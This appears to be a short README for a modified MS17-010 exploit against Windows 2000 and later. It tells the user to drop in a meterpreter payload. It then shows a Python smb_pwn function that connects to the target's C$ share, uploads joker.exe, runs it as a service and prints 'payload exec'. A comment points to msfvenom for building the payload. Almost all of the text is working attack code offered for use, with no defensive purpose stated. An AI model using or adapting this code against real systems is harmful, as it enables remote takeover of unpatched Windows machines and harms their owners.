# MS17-010 exploit
MS17-010 exploit for Windows 2000 and later by sleepya mod by joker2a

Add your meterpreter (joker.exe) :

def smb_pwn(conn, arch):
	smbConn = conn.get_smbconnection()
	
	print('creating file c:\\pwned.txt on the target')
	tid2 = smbConn.connectTree('C$')
	fid2 = smbConn.createFile(tid2, '/pwned.txt')
	smbConn.closeFile(tid2, fid2)
	
	smb_send_file(smbConn, 'joker.exe', 'C', '/joker.exe')
        service_exec(conn, r'cmd /c c:\\joker.exe')
        print ('payload exec')
        smbConn.disconnectTree(tid2)

        #service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
	# Note: there are many methods to get shell over SMB admin session
	# a simple method to get shell (but easily to be detected by AV) is
	# executing binary generated by "msfvenom -f exe-service ..."
